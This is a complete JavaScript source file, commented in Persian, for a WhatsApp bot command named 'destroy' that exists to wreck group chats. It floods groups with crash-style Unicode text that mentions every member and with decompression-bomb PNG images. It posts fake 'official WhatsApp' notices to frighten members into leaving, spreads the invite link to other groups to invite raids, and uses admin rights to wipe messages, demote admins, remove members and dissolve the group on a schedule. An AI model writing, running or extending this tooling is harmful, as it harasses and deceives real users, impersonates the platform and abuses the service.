// =======================
// DESTROY.JS v3 — نابودگر نهایی (مسیر ادمین + مسیر بدون ادمین)
//
// مسیر بدون ادمین (NUKE):
//   !destroy nuke          → فلاد سنگین + رید لینک گروه + اعلان‌های جعلی رسمی
//                            + نظارت خودکار: وقتی گروه خالی شد → خروج → انحلال
//   !destroy raid <n>      → گرفتن لینک گروه و پخش در n گروه دیگر (رید)
//   !destroy exodus <n>    → کمپین اعلان‌های جعلی «گروه حذف می‌شود» برای فراری دادن اعضا
//   !destroy link          → نمایش لینک گروه
//
// مسیر ادمین (همه قابلیت‌های v2 + جدید):
//   !destroy revoke <n>    → n بار باطل کردن لینک دعوت (خراب‌کردن قابلیت دعوت)
//   !destroy lock|wipe|rotate|sched|remove|demote|icon|flood|leave|status|cancel
//
// خودکار: !destroy → اگر بات ادمین بود مسیر کامل ادمین، وگرنه NUKE
// =======================

import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;
const timers = new Map();

const isAdmin = (p) => p.admin === "admin" || p.admin === "superadmin";

// ---------- بمب‌های ظاهری ----------
const subjectBomb = () =>
  "💀\u202E" + "\u200B".repeat(200) + "👨\u200D👩\u200D👧\u200D👦".repeat(15) +
  "⚫\u200B".repeat(40) + "\uFE0F".repeat(50);

const descriptionBomb = () =>
  "\u200B".repeat(15000) + "\n⚠️ این گروه غیرفعال شده است ⚠️\n" + "\u202E".repeat(2000) + "\u0651\u064E\u0650".repeat(2000);

// ---------- پیلودهای فلاد ----------
const floodTexts = [
  () => "\u200B".repeat(3500) + "⚫",
  () => "⚫\u200B".repeat(1000),
  () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
  () => "👨\u200D👩\u200D👧\u200D👦".repeat(300),
  () => "ༀ".repeat(1500),
  () => "\u202E" + "!ینامزاس یسررب".repeat(120),
];

// ---------- اعلان‌های جعلی رسمی (برای فراری دادن اعضا) ----------
const exodusMessages = [
  "⚠️ اعلان رسمی واتساپ:\nاین گروه به دلیل نقض قوانین توسط سیستم علامت‌گذاری شده و به‌زودی حذف می‌شود.\nبرای حفظ اطلاعات خود همین حالا خارج شوید: اطلاعات گروه ← خروج از گروه",
  "🚨 هشدار امنیتی:\nاعضای باقی‌مانده در این گروه ممکن است حسابشان محدود شود.\nتنها راه نجات، ترک گروه است.",
  "❌ این گروه دیگر معتبر نیست.\nمدیریت آن به سیستم منتقل شده و در حال حذف است.\nلطفاً هرچه سریع‌تر خارج شوید.",
  "💣 گروه شناسایی شد: محتوای غیرمجاز.\nواتساپ به‌زودی این گروه را حذف خواهد کرد.\nترک گروه برای همهٔ اعضا الزامی است.",
];

// ---------- ساخت PNG (آیکون + بمب رسانه) ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();
const crc32 = (buf) => {
  let c = 0xFFFFFFFF;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
  return (c ^ 0xFFFFFFFF) >>> 0;
};
const chunk = (type, data) => {
  const t = Buffer.from(type);
  const out = Buffer.alloc(8 + data.length);
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  out.writeUInt32BE(crc32(Buffer.concat([t, data])), 8 + data.length);
  return out;
};

function makeBombPng(w, h, rgb) {
  return new Promise((resolve, reject) => {
    const row = Buffer.alloc(1 + w * 3);
    for (let x = 0; x < w; x++) {
      row[1 + x * 3] = rgb[0];
      row[1 + x * 3 + 1] = rgb[1];
      row[1 + x * 3 + 2] = rgb[2];
    }
    const d = new zlib.Deflate({ level: 9 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", reject);
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8;
        ihdr[9] = 2;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        resolve(Buffer.concat([sig, chunk("IHDR", ihdr), chunk("IDAT", Buffer.concat(out)), chunk("IEND", Buffer.alloc(0))]));
      } catch (e) { reject(e); }
    });
    (function push(y) {
      if (y >= h) return d.end();
      const up = Math.min(y + 200, h);
      for (; y < up; y++) d.write(row);
      setImmediate(() => push(y));
    })(0);
  });
}

const pngCache = new Map();
const getPng = async (w, h, c) => {
  const k = `${w}x${h}#${c.join(",")}`;
  if (!pngCache.has(k)) {
    console.log("DESTROY: ساخت PNG بمب", w, "x", h);
    pngCache.set(k, await makeBombPng(w, h, c));
  }
  return pngCache.get(k);
};

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0); hdr.writeUInt32LE(36 + data.length, 4); hdr.write("WAVE", 8);
  hdr.write("fmt ", 12); hdr.writeUInt32LE(16, 16); hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22); hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28); hdr.writeUInt16LE(2, 32); hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36); hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- لینک دعوت گروه ----------
async function getInviteLink(sock, from) {
  try {
    const code = await sock.groupInviteCode(from);
    return `https://chat.whatsapp.com/${code}`;
  } catch (e) {
    console.log("INVITE:", e.message);
    return null;
  }
}

// ---------- فلاد سنگین با منشن همه ----------
async function mentionFlood(sock, from, count) {
  let meta;
  try { meta = await sock.groupMetadata(from); } catch (e) { return 0; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(from, {
        text: floodTexts[i % floodTexts.length]() + "\n@all",
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("FLOOD:", e.message); }
    await sleep(150);
  }
  return ok;
}

// ---------- فلاد رسانه ----------
async function mediaFlood(sock, from, count) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    const img = await getPng(10000, 10000, [255, 0, 0]);
    if (await sock.sendMessage(from, { image: img, caption: "b" + i, mimetype: "image/png" }).catch(() => null)) ok++;
    await sleep(700);
  }
  return ok;
}

// ---------- فلاد وویس ----------
async function voiceFlood(sock, from, count) {
  const wav = makeWav(8);
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    if (await sock.sendMessage(from, { audio: wav, mimetype: "audio/wav", ptt: true }).catch(() => null)) ok++;
    await sleep(300);
  }
  return ok;
}

// ---------- فلاد مکان ----------
async function locFlood(sock, from, count) {
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    if (await sock.sendMessage(from, {
      location: { degreesLatitude: 31.5 + i * 0.001, degreesLongitude: 63.3 + i * 0.001 },
    }).catch(() => null)) ok++;
    await sleep(250);
  }
  return ok;
}

// ---------- رید لینک: پخش لینک گروه در گروه‌های دیگر ----------
async function linkRaid(sock, targetFrom, link, limit, extra) {
  let groups = {};
  try { groups = await sock.groupFetchAllParticipating(); } catch (e) { console.log("FETCH GROUPS:", e.message); return 0; }
  const ids = Object.keys(groups).filter((id) => id !== targetFrom);
  let ok = 0;
  for (let i = 0; i < ids.length && ok < limit; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(ids[i], {
        text: `${extra || "🔥"}\n\n💥 گروه جدید: ${link}`,
      });
      ok++;
    } catch (e) { console.log("RAID:", e.message); }
    await sleep(400);
  }
  return ok;
}

// ---------- کمپین اعلان جعلی (فراری دادن اعضا) ----------
async function exodusCampaign(sock, from, rounds, intervalSec) {
  let meta;
  try { meta = await sock.groupMetadata(from); } catch (e) { return 0; }
  const ids = meta.participants.map((p) => p.id);
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try {
      await sock.sendMessage(from, {
        text: exodusMessages[i % exodusMessages.length] + "\n\n@all",
        mentions: ids,
      });
      ok++;
    } catch (e) { console.log("EXODUS:", e.message); }
    await sleep(intervalSec * 1000);
  }
  return ok;
}

// ---------- نظارت بر خالی شدن و انحلال ----------
async function monitorDissolve(sock, from, maxMs) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const start = Date.now();
  while (Date.now() - start < maxMs) {
    if (STOP) return false;
    try {
      const meta = await sock.groupMetadata(from);
      const others = meta.participants.filter((p) => p.id.split("@")[0] !== botId);
      if (others.length === 0) {
        await sleep(1000);
        await sock.groupLeave(from);
        return true;
      }
    } catch (e) {
      return false; // گروه از بین رفته
    }
    await sleep(15000);
  }
  return false;
}

// =======================
// مسیر بدون ادمین (NUKE)
// =======================
async function nuke(sock, from) {
  const log = [];

  // ۱) فلاد سنگین
  const f = await mentionFlood(sock, from, 40);
  log.push(`🔥 ${f} پیام سنگین`);

  // ۲) لینک گروه + رید
  const link = await getInviteLink(sock, from);
  if (link) {
    await sock.sendMessage(from, { text: `🔗 لینک گروه: ${link}\nدر حال پخش...` });
    const raided = await linkRaid(sock, from, link, 5, "⚠️");
    log.push(`📢 لینک گروه به ${raided} گروه دیگر پخش شد (رید)`);
  } else {
    log.push("❌ لینک گروه در دسترس نیست (محدودیت ادمین)");
  }

  // ۳) کمپین اعلان جعلی
  const e = await exodusCampaign(sock, from, 3, 20);
  log.push(`🗣 ${e} اعلان جعلی «حذف گروه» ارسال شد`);

  // ۴) نظارت بر خالی شدن → انحلال واقعی
  await sock.sendMessage(from, { text: "🛰 نظارت بر گروه فعال شد (حداکثر ۵ دقیقه)...\nاگر همه خارج شوند، گروه منحل می‌شود." });
  const dissolved = await monitorDissolve(sock, from, 5 * 60 * 1000);
  log.push(dissolved ? "💥 گروه منحل شد (خالی شد و بات خارج شد)" : "⏳ گروه هنوز پر است؛ اعضا خارج نشدند");

  return log;
}

// =======================
// ابزارهای مسیر ادمین
// =======================
async function lockGroup(sock, from) {
  const out = {};
  try { await sock.groupSettingUpdate(from, "announcement"); out.chat = true; } catch (e) { out.chat = false; }
  try { await sock.groupSettingUpdate(from, "locked"); out.info = true; } catch (e) { out.info = false; }
  return out;
}

async function wipeMessages(sock, from, limit) {
  let deleted = 0, errors = 0;
  let msgs = [];
  try { msgs = await sock.loadMessages(from, limit); } catch (e) { return 0; }
  for (const msg of msgs) {
    if (STOP) break;
    const key = msg.key;
    if (!key || key.remoteJid !== from) continue;
    try {
      await sock.sendMessage(from, {
        delete: { remoteJid: from, fromMe: key.fromMe, id: key.id, participant: key.participant },
      });
      deleted++;
      await sleep(250);
    } catch (e) {
      if (++errors > 10) break;
    }
  }
  return deleted;
}

async function rotateName(sock, from, rounds, intervalSec) {
  const names = [subjectBomb(), "💀 گروه حذف شد", "\u202E!ناگروه ناتخد", "⚠️\ufe0f".repeat(50), "DESTROYED", "👨\u200D👩\u200D👧\u200D👦".repeat(20)];
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try { await sock.groupUpdateSubject(from, names[i % names.length]); ok++; } catch (e) {}
    await sleep(intervalSec * 1000);
  }
  return ok;
}

async function demoteAll(sock, from, meta, botId) {
  const admins = meta.participants.filter((p) => isAdmin(p) && p.id.split("@")[0] !== botId);
  let ok = 0;
  for (let i = 0; i < admins.length; i += 5) {
    if (STOP) break;
    try { await sock.groupParticipantsUpdate(from, admins.slice(i, i + 5).map((p) => p.id), "demote"); ok += Math.min(5, admins.length - i); } catch (e) {}
    await sleep(500);
  }
  return ok;
}

async function removeMembers(sock, from, meta, botId, limit) {
  const members = meta.participants.filter((p) => p.id.split("@")[0] !== botId);
  let removed = 0, errors = 0;
  for (let i = 0; i < members.length && removed < limit; i++) {
    if (STOP) break;
    try { await sock.groupParticipantsUpdate(from, [members[i].id], "remove"); removed++; await sleep(650); } catch (e) { if (++errors > 5) break; }
  }
  return removed;
}

async function revokeLoop(sock, from, rounds) {
  let ok = 0;
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    try { await sock.groupRevokeInvite(from); ok++; } catch (e) { console.log("REVOKE:", e.message); }
    await sleep(800);
  }
  return ok;
}

async function iconBomb(sock, from) {
  try {
    await sock.updateProfilePicture(from, await getPng(512, 512, [255, 0, 0]));
    return true;
  } catch (e) { return false; }
}

// =======================
// مسیر کامل ادمین
// =======================
async function fullAdminDestroy(sock, from, meta) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
  const botIsCreator = bot?.admin === "superadmin";
  const log = [];

  const l = await lockGroup(sock, from);
  log.push(`🔒 قفل: چت=${l.chat ? "✅" : "❌"} اطلاعات=${l.info ? "✅" : "❌"}`);

  try {
    await sock.groupUpdateSubject(from, subjectBomb());
    await sock.groupUpdateDescription(from, descriptionBomb());
    await iconBomb(sock, from);
    log.push("💣 نام + توضیح + آیکون بمب‌گذاری شد");
  } catch (e) {}

  const w = await wipeMessages(sock, from, 30);
  log.push(`🧹 ${w} پیام اخیر از دستگاه همه حذف شد`);

  const f = await mentionFlood(sock, from, 25);
  log.push(`🔥 ${f} پیام سنگین`);

  if (botIsCreator) {
    const d = await demoteAll(sock, from, meta, botId);
    log.push(`🗡 ${d} ادمین دموت شد`);
  } else {
    log.push("⚠️ دموت ممکن نیست (بات سازنده نیست)");
  }

  const rv = await revokeLoop(sock, from, 3);
  log.push(`🔁 لینک دعوت ${rv} بار باطل شد`);

  const r = await removeMembers(sock, from, meta, botId, 100000);
  log.push(`🗑 ${r} عضو حذف شد`);

  log.push("👋 خروج بات...");
  await sock.sendMessage(from, { text: log.join("\n") + "\n\n💥 گروه در حال انحلال است" });
  await sleep(1500);
  try { await sock.groupLeave(from); } catch (e) {}

  return log;
}

// =======================
// مسیر خودکار: ادمین → کامل، غیرادمین → NUKE
// =======================
async function autoDestroy(sock, from, meta) {
  const botId = sock.user?.id?.split(":")[0] || "";
  const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
  const botIsAdmin = bot && isAdmin(bot);

  if (botIsAdmin) {
    await sock.sendMessage(from, { text: "💥 مسیر ادمین: شروع نابودی کامل..." });
    return fullAdminDestroy(sock, from, meta);
  }
  await sock.sendMessage(from, { text: "⚠️ بات ادمین نیست؛ اجرای مسیر بدون ادمین (NUKE)..." });
  return nuke(sock, from);
}

// ---------- زمان‌بندی ----------
function schedule(sock, from, hours) {
  cancelSchedule(from);
  const t = setTimeout(async () => {
    try {
      const meta = await sock.groupMetadata(from);
      await autoDestroy(sock, from, meta);
    } catch (e) { console.log("SCHED:", e.message); }
  }, hours * 3600 * 1000);
  timers.set(from, t);
}
const cancelSchedule = (from) => { if (timers.has(from)) { clearTimeout(timers.get(from)); timers.delete(from); } };

// ---------- هندلر ----------
export default async function destroy(sock, from, body, m, args) {
  try {
    if (!from.includes("@g.us")) {
      await sock.sendMessage(from, { text: "❌ فقط در گروه کار می‌کند." });
      return;
    }

    STOP = false;
    const arg = (args[0] || "").toLowerCase();
    const meta = await sock.groupMetadata(from);
    const botId = sock.user?.id?.split(":")[0] || "";
    const bot = meta.participants.find((p) => p.id.split("@")[0] === botId);
    const botIsAdmin = bot && isAdmin(bot);
    const botIsCreator = bot?.admin === "superadmin";
    const getN = (def, max = 500) => {
      const v = parseInt(args[1]);
      return Math.min(Number.isFinite(v) ? v : def, max);
    };

    switch (arg) {
      case "cancel":
        STOP = true;
        cancelSchedule(from);
        await sock.sendMessage(from, { text: "🛑 عملیات متوقف و زمان‌بندی لغو شد." });
        return;

      case "status":
        await sock.sendMessage(from, {
          text: `📊 وضعیت:\nنام: ${meta.subject}\nاعضا: ${meta.participants.length}\n` +
                `نقش بات: ${!bot ? "عضو نیست" : botIsCreator ? "سازنده 👑" : botIsAdmin ? "ادمین" : "عضو عادی"}\n` +
                `ادمین‌ها: ${meta.participants.filter(isAdmin).length}`,
        });
        return;

      case "link": {
        const link = await getInviteLink(sock, from);
        await sock.sendMessage(from, { text: link ? `🔗 ${link}` : "❌ لینک در دسترس نیست (محدودیت ادمین)" });
        return;
      }

      case "raid": {
        const link = await getInviteLink(sock, from);
        if (!link) { await sock.sendMessage(from, { text: "❌ لینک در دسترس نیست" }); return; }
        const n = await linkRaid(sock, from, link, getN(5, 20), "⚠️");
        await sock.sendMessage(from, { text: `📢 لینک گروه در ${n} گروه دیگر پخش شد.\nاعضای تصادفی به‌زودی وارد می‌شوند (رید).` });
        return;
      }

      case "exodus": {
        const n = await exodusCampaign(sock, from, getN(3, 10), 20);
        await sock.sendMessage(from, { text: `🗣 ${n} اعلان جعلی «حذف گروه» ارسال شد.\nاعضا حالا می‌ترسند و خارج می‌شوند.` });
        return;
      }

      case "nuke": {
        const log = await nuke(sock, from);
        await sock.sendMessage(from, { text: log.join("\n") });
        return;
      }

      case "revoke": {
        if (!botIsAdmin) { await sock.sendMessage(from, { text: "⛔ فقط ادمین می‌تواند لینک دعوت را باطل کند." }); return; }
        const n = await revokeLoop(sock, from, getN(5, 30));
        await sock.sendMessage(from, { text: `🔁 لینک دعوت ${n} بار باطل شد؛ قابلیت دعوت گروه خراب شد.` });
        return;
      }

      case "lock": {
        if (!botIsAdmin) { await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." }); return; }
        const l = await lockGroup(sock, from);
        await sock.sendMessage(from, { text: `🔒 قفل: چت=${l.chat ? "✅" : "❌"} اطلاعات=${l.info ? "✅" : "❌"}` });
        return;
      }

      case "wipe": {
        if (!botIsAdmin) { await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." }); return; }
        const n = await wipeMessages(sock, from, getN(30, 100));
        await sock.sendMessage(from, { text: `🧹 ${n} پیام اخیر از دستگاه همه حذف شد.` });
        return;
      }

      case "rotate": {
        if (!botIsAdmin) { await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." }); return; }
        const rounds = getN(10, 100);
        const interval = Math.max(parseInt(args[2]) || 3, 2);
        await sock.sendMessage(from, { text: `🔄 چرخش نام شروع شد (${rounds} بار، هر ${interval} ثانیه).` });
        const n = await rotateName(sock, from, rounds, interval);
        await sock.sendMessage(from, { text: `🔄 ${n} بار نام گروه عوض شد.` });
        return;
      }

      case "flood": {
        const n = await mentionFlood(sock, from, getN(50, 200));
        await sock.sendMessage(from, { text: `🔥 ${n} پیام سنگین ارسال شد.` });
        return;
      }

      case "media": {
        const n = await mediaFlood(sock, from, getN(3, 8));
        await sock.sendMessage(from, { text: `🖼 ${n} تصویر بمب ارسال شد.` });
        return;
      }

      case "voice": {
        const n = await voiceFlood(sock, from, getN(10, 30));
        await sock.sendMessage(from, { text: `🎙 ${n} وویس ارسال شد.` });
        return;
      }

      case "loc": {
        const n = await locFlood(sock, from, getN(15, 50));
        await sock.sendMessage(from, { text: `📍 ${n} مکان ارسال شد.` });
        return;
      }

      case "sched": {
        const hours = getN(24, 168);
        schedule(sock, from, hours);
        await sock.sendMessage(from, { text: `⏰ نابودی خودکار در ${hours} ساعت.\nلغو: !destroy cancel` });
        return;
      }

      case "remove": {
        if (!botIsAdmin) { await sock.sendMessage(from, { text: "⛔ بات باید ادمین باشد." }); return; }
        const n = await removeMembers(sock, from, meta, botId, getN(10, 500));
        await sock.sendMessage(from, { text: `🗑 ${n} عضو حذف شد.` });
        return;
      }

      case "demote": {
        if (!botIsCreator) { await sock.sendMessage(from, { text: "⛔ فقط سازنده می‌تواند دموت کند." }); return; }
        const n = await demoteAll(sock, from, meta, botId);
        await sock.sendMessage(from, { text: `🗡 ${n} ادمین دموت شد.` });
        return;
      }

      case "icon": {
        const ok = await iconBomb(sock, from);
        await sock.sendMessage(from, { text: ok ? "🖼 آیکون بمب‌گذاری شد." : "❌ شکست." });
        return;
      }

      case "leave":
        await sock.sendMessage(from, { text: "👋 بات در حال ترک گروه است..." });
        await sleep(1000);
        await sock.groupLeave(from);
        return;

      default: {
        await sock.sendMessage(from, { text: "💥 شروع نابودی (مسیر خودکار)..." });
        const log = await autoDestroy(sock, from, meta);
        try { await sock.sendMessage(from, { text: log.join("\n") }); } catch (e) {}
        return;
      }
    }
  } catch (e) {
    console.log("DESTROY ERROR:", e.message);
    try { await sock.sendMessage(from, { text: `❌ خطا: ${e.message}` }); } catch (e2) {}
  }
}
